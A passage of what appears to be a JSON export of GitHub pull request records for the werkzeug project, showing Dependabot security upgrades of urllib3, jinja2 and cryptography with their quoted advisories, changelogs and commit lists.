1.26.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/releases\">urllib3's releases</a>.</em></p>\n<blockquote>\n<h2>1.26.4</h2>\n<p>:warning: <strong>IMPORTANT: urllib3 v2.0 will drop support for Python 2</strong>: <a href=\"https://urllib3.readthedocs.io/en/latest/v2-roadmap.html\">Read more in the v2.0 Roadmap</a></p>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n<p><strong>If you or your organization rely on urllib3 consider supporting us via <a href=\"https://github.com/sponsors/urllib3\">GitHub Sponsors</a></strong></p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/blob/main/CHANGES.rst\">urllib3's changelog</a>.</em></p>\n<blockquote>\n<h1>1.26.4 (2021-03-15)</h1>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/a8913042b676c510e94fc2b097f6b514ae11a537\"><code>a891304</code></a> Release 1.26.4</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/8d65ea1ecf6e2cdc27d42124e587c1b83a3118b0\"><code>8d65ea1</code></a> Merge pull request from GHSA-5phf-pp7p-vc2r</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/5e3432646ad63749ff0d655c157fe293cdc6c2aa\"><code>5e34326</code></a> Add proper stacklevel to method_allowlist warning</li>\n<li>See full diff in <a href=\"https://github.com/urllib3/urllib3/compare/1.26.3...1.26.4\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2080",
                    "merged_at": "2021-04-06T18:03:38Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2070",
                "title": "[Security] Bump jinja2 from 2.11.2 to 2.11.3",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2070,
                "id": 836379451,
                "state": "closed",
                "project_created_at": "2021-03-19T21:43:22Z",
                "closed_at": "2021-03-19T21:45:45Z",
                "body": "Bumps [jinja2](https://github.com/pallets/jinja) from 2.11.2 to 2.11.3. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-g3rq-g295-4j3m\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Regular Expression Denial of Service (ReDoS)</strong>\nThis affects the package jinja2 from 0.0.0 and before 2.11.3. The ReDOS vulnerability of the regex is mainly due to the sub-pattern [a-zA-Z0-9.<em>-]+.[a-zA-Z0-9.</em>-]+ This issue can be mitigated by Markdown to format user content instead of the urlize filter, or by implementing request timeouts and limiting process memory.</p>\n<p>Affected versions: &lt; 2.11.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/pallets/jinja/releases\">jinja2's releases</a>.</em></p>\n<blockquote>\n<h2>2.11.3</h2>\n<p>This contains a fix for a speed issue with the <code>urlize</code> filter. <code>urlize</code> is likely to be called on untrusted user input. For certain inputs some of the regular expressions used to parse the text could take a very long time due to backtracking. As part of the fix, the email matching became slightly stricter. The various speedups apply to <code>urlize</code> in general, not just the specific input cases.</p>\n<ul>\n<li>PyPI: <a href=\"https://pypi.org/project/Jinja2/2.11.3/\">https://pypi.org/project/Jinja2/2.11.3/</a></li>\n<li>Changes: <a href=\"https://jinja.palletsprojects.com/en/2.11.x/changelog/#version-2-11-3\">https://jinja.palletsprojects.com/en/2.11.x/changelog/#version-2-11-3</a></li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/pallets/jinja/blob/master/CHANGES.rst\">jinja2's changelog</a>.</em></p>\n<blockquote>\n<h1>Version 2.11.3</h1>\n<p>Released 2021-01-31</p>\n<ul>\n<li>Improve the speed of the <code>urlize</code> filter by reducing regex backtracking. Email matching requires a word character at the start of the domain part, and only word characters in the TLD. 1343</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/pallets/jinja/commit/cf215390d4a4d6f0a4de27e2687eed176878f13d\"><code>cf21539</code></a> release version 2.11.3</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/15ef8f09b659f9100610583938005a7a10472d4d\"><code>15ef8f0</code></a> Merge pull request <a href=\"https://github-redirect.dependabot.com/pallets/jinja/issues/1343\">#1343</a> from pallets/urlize-speedup</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/ef658dc3b6389b091d608e710a810ce8b87995b3\"><code>ef658dc</code></a> speed up urlize matching</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/eeca0fecc3318d43f61bc340ad61db641b861ade\"><code>eeca0fe</code></a> Merge pull request <a href=\"https://github-redirect.dependabot.com/pallets/jinja/issues/1207\">#1207</a> from mhansen/patch-1</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/2dd769111cbb1a2637f805b3b4c652ec8096d371\"><code>2dd7691</code></a> Merge pull request <a href=\"https://github-redirect.dependabot.com/pallets/jinja/issues/1209\">#1209</a> from mhansen/patch-3</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/48929401db7228db04dfd8e88115dd5c30dc2d86\"><code>4892940</code></a> do_dictsort: update example ready to copy/paste</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/7db7d336ba12574e6205fdd929386fd529e3fad4\"><code>7db7d33</code></a> api.rst: bugfix in docs, import PackageLoader</li>\n<li><a href=\"https://github.com/pallets/jinja/commit/9ec465baefe32e305bd4e61da49e6c39360c194e\"><code>9ec465b</code></a> fix changelog header</li>\n<li>See full diff in <a href=\"https://github.com/pallets/jinja/compare/2.11.2...2.11.3\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=jinja2&package-manager=pip&previous-version=2.11.2&new-version=2.11.3)](https://dependabot.com/compatibility-score/?dependency-name=jinja2&package-manager=pip&previous-version=2.11.2&new-version=2.11.3)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2070",
                    "merged_at": "2021-03-19T21:45:45Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2069",
                "title": "[Security] Bump urllib3 from 1.26.2 to 1.26.3",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2069,
                "id": 836308137,
                "state": "closed",
                "project_created_at": "2021-03-19T19:50:48Z",
                "closed_at": "2021-03-19T19:52:44Z",
                "body": "Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.26.2 to 1.26.3. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-5phf-pp7p-vc2r\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection</strong></p>\n<h3>Impact</h3>\n<p>Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via <code>proxy_config</code>.\nOnly the default SSLContext is impacted.</p>\n<h3>Patches</h3>\n<p><a href=\"https://github.com/urllib3/urllib3/releases/tag/1.26.4\">urllib3 &gt;=1.26.4 has the issue resolved</a>. urllib3&lt;1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.</p>\n<h3>Workarounds</h3>\n<p>Upgrading is recommended as this is a minor release and not likely to break current usage.</p>\n<p>Configuring an <code>SSLContext</code> with <code>check_hostname=True</code> and passing via <code>proxy_config</code> instead of relying on the default <code>SSLContext</code></p>\n<h3>For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:sethmichaellarson@gmail.com\">sethmichaellarson@gmail.com</a></li>\n</ul>\n<p>Affected versions: &gt;= 1.26.0, &lt; 1.26.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/releases\">urllib3's releases</a>.</em></p>\n<blockquote>\n<h2>1.26.3</h2>\n<p>:warning: <strong>IMPORTANT: urllib3 v2.0 will drop support for Python 2</strong>: <a href=\"https://urllib3.readthedocs.io/en/latest/v2-roadmap.html\">Read more in the v2.0 Roadmap</a></p>\n<ul>\n<li>\n<p>Fixed bytes and string comparison issue with headers (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2141\">#2141</a>)</p>\n</li>\n<li>\n<p>Changed <code>ProxySchemeUnknown</code> error message to be more actionable if the user supplies a proxy URL without a scheme (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2107\">#2107</a>)</p>\n</li>\n</ul>\n<p><strong>If you or your organization rely on urllib3 consider supporting us via <a href=\"https://github.com/sponsors/urllib3\">GitHub Sponsors</a></strong></p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/blob/main/CHANGES.rst\">urllib3's changelog</a>.</em></p>\n<blockquote>\n<h1>1.26.3 (2021-01-26)</h1>\n<ul>\n<li>Fixed bytes and string comparison issue with headers (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2141\">#2141</a>)</li>\n<li>Changed <code>ProxySchemeUnknown</code> error message to be more actionable if the user supplies a proxy URL without a scheme. (Pull <a href=\"https://github-redirect.dependabot.com/urllib3/urllib3/issues/2107\">#2107</a>)</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/361f1e2a61afdef86cb2feb0fa3f302e06c5fe2c\"><code>361f1e2</code></a> Release 1.26.3</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/3179dfdac1ca8137fe2d5d480a18642311adf0fb\"><code>3179dfd</code></a> Allow using deprecated OpenSSL with CRYPTOGRAPHY_ALLOW_OPENSSL_102</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/d97e5d4cbd96f21b4d16ae914d5797ac44a6dbdd\"><code>d97e5d4</code></a> Use Python 3.5 compatible get-pip</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/cb5e2fc6af52b226e3ce68414b1afa23416a036d\"><code>cb5e2fc</code></a> [1.26] Don't compare bytes and str in putheader()</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/b89158f30f9fa427ec3cbad29368d917f4fdd367\"><code>b89158f</code></a> [1.26] Update RECENT_DATE to 2020-07-01</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/a800c745969ef7d06ad3ea0a7722da521f2934cd\"><code>a800c74</code></a> [1.26] Recommend GitHub Sponsors instead of Open Collective</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/947284e6bede3fe4e1098844680a36c0389c2c85\"><code>947284e</code></a> [1.26] Improve message for ProxySchemeUnknown exception</li>\n<li>See full diff in <a href=\"https://github.com/urllib3/urllib3/compare/1.26.2...1.26.3\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.26.2&new-version=1.26.3)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.26.2&new-version=1.26.3)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2069",
                    "merged_at": "2021-03-19T19:52:44Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2038",
                "title": "[Security] Bump cryptography from 3.3.1 to 3.3.2",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2038,
                "id": 805073657,
                "state": "closed",
                "project_created_at": "2021-02-10T01:38:06Z",
                "closed_at": "2021-02-10T01:40:47Z",
                "body": "Bumps [cryptography](https://github.com/pyca/cryptography) from 3.3.1 to 3.3.2. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-rhm9-p9w5-fwm7\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Symmetrically encrypting large values can lead to integer overflow</strong></p>\n<h3>Impact</h3>\n<p>When certain sequences of <code>update()</code> calls with large values (multiple GBs) for symetric encryption or decryption occur, it's possible for an integer overflow to happen, leading to mishandling of buffers.</p>\n<h3>Patches</h3>\n<p>This is patched in version 3.3.2 and newer.</p>\n<h3>References</h3>\n<ul>\n<li><a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5615\">pyca/cryptography#5615</a></li>\n</ul>\n<p>Affected versions: &gt;= 3.1, &lt; 3.3.2</p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst\">cryptography's changelog</a>.</em></p>\n<blockquote>\n<h1>3.3.2 - 2021-02-07</h1>\n<ul>\n<li><strong>SECURITY ISSUE:</strong> Fixed a bug where certain sequences of <code>update()</code> calls when symmetrically encrypting very large payloads (&gt;2GB) could result in an integer overflow, leading to buffer overflows. <em>CVE-2020-36242</em></li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/commit/82b6ce28389f0a317bc55ba2091a74b346db7cae\"><code>82b6ce2</code></a> correct buffer overflows cause by integer overflow in openssl (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5747\">#5747</a>)</li>\n<li>See full diff in <a href=\"https://github.com/pyca/cryptography/compare/3.3.1...3.3.2\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=cryptography&package-manager=pip&previous-version=3.3.1&new-version=3.3.2)](https://dependabot.com/compatibility-score/?dependency-name=cryptography&package-manager=pip&previous-version=3.3.1&new-version=3.3.2)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2038",
                    "merged_at": "2021-02-10T01:40:47Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/1950",
                "title": "[Security] Bump cryptography from 3.1.1 to 3.2",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 1950,
                "id": 730808911,
                "state": "closed",
                "project_created_at": "2020-10-27T20:48:50Z",
                "closed_at": "2020-10-27T20:54:56Z",
                "body": "Bumps [cryptography](https://github.com/pyca/cryptography) from 3.1.1 to 3.2. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-hggm-jpg3-v476\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>RSA decryption vulnerable to Bleichenbacher timing vulnerability</strong></p>\n<h3>Impact</h3>\n<p>RSA decryption was vulnerable to Bleichenbacher timing vulnerabilities, which would impact people using RSA decryption in online scenarios.</p>\n<h3>Patches</h3>\n<p>This is fixed in cryptography 3.2. <a href=\"https://github.com/pyca/cryptography/commit/58494b41d6ecb0f56b7c5f05d5f5e3ca0320d494\">https://github.com/pyca/cryptography/commit/58494b41d6ecb0f56b7c5f05d5f5e3ca0320d494</a> is the resolving commit.</p>\n<p>Affected versions: &lt; 3.2</p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst\">cryptography's changelog</a>.</em></p>\n<blockquote>\n<h1>3.2 - 2020-10-25</h1>\n<ul>\n<li><strong>SECURITY ISSUE:</strong> Attempted to make RSA PKCS#1v1.5 decryption more constant time, to protect against Bleichenbacher vulnerabilities. Due to limitations imposed by our API, we cannot completely mitigate this vulnerability and a future release will contain a new API which is designed to be resilient to these for contexts where it is required. Credit to <strong>Hubert Kario</strong> for reporting the issue. <em>CVE-2020-25659</em></li>\n<li>Support for OpenSSL 1.0.2 has been removed. Users on older version of OpenSSL will need to upgrade.</li>\n<li>Added basic support for PKCS7 signing (including SMIME) via ~cryptography.hazmat.primitives.serialization.pkcs7.PKCS7SignatureBuilder.</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/commit/c9e65222c91df8b6f61650a3460e30232962c1e0\"><code>c9e6522</code></a> 3.2 release (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5508\">#5508</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/58494b41d6ecb0f56b7c5f05d5f5e3ca0320d494\"><code>58494b4</code></a> Attempt to mitigate Bleichenbacher attacks on RSA decryption (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5507\">#5507</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/cf9bd6a36bc7b05abca114b76e216598d9ad9b16\"><code>cf9bd6a</code></a> move blinding to <strong>init</strong> on both RSA public and private (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5506\">#5506</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/bf4b962f4b92a1633835b2d17974f18de2d61620\"><code>bf4b962</code></a> be more verbose in the 102 deprecation notice (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5505\">#5505</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/ada53e7ca0f04a33711c330a130d34376e5ecc2b\"><code>ada53e7</code></a> make the regexes for branches more strict (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5504\">#5504</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/8be1d4b1113eabea306dd60ab64e7f00815d6a52\"><code>8be1d4b</code></a> Stop using <a href=\"https://github.com/master\">@master</a> for GH actions (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5503\">#5503</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/08a97cca715ca0842d6792d0079e351efbb48ec9\"><code>08a97cc</code></a> Bump actions/upload-artifact from v1 to v2.2.0 (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5502\">#5502</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/52a0e44e97dd6e150509b14c9b1f76a261f12786\"><code>52a0e44</code></a> Add a dependabot configuration to bump our github actions (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5501\">#5501</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/611c4a340f6c53a7e28a9695a3248bd4e9f8558d\"><code>611c4a3</code></a> PKCS7SignatureBuilder now supports new option NoCerts when signing (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5500\">#5500</a>)</li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/836a92a28fbe9df8c37121e340b91ed9cd519ddd\"><code>836a92a</code></a> chunking didn't actually work (<a href=\"https://github-redirect.dependabot.com/pyca/cryptography/issues/5499\">#5499</a>)</li>\n<li>Additional commits viewable in <a href=\"https://github.com/pyca/cryptography/compare/3.1.1...3.2\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=cryptography&package-manager=pip&previous-version=3.1.1&new-version=3.2)](https://dependabot.com/compatibility-score/?dependency-name=cryptography&package-manager=pip&previous-version=3.1.1&new-version=3.2)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n- `@dependabot badge me` will comment on this PR with code to add a \"Dependabot enabled\" badge to your readme\n\nAdditionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):\n- Update frequency (including time of day and day of week)\n- Pull request limits (per update run and/or open at any time)\n- Automerge options (never/patch/minor, and dev/runtime dependencies)\n- Out-of-range updates (receive only lockfile updates, if desired)\n- Security updates (receive only security updates, if desired)\n\n\n\n</details>",
                "comments": [],
                "pull_request": {
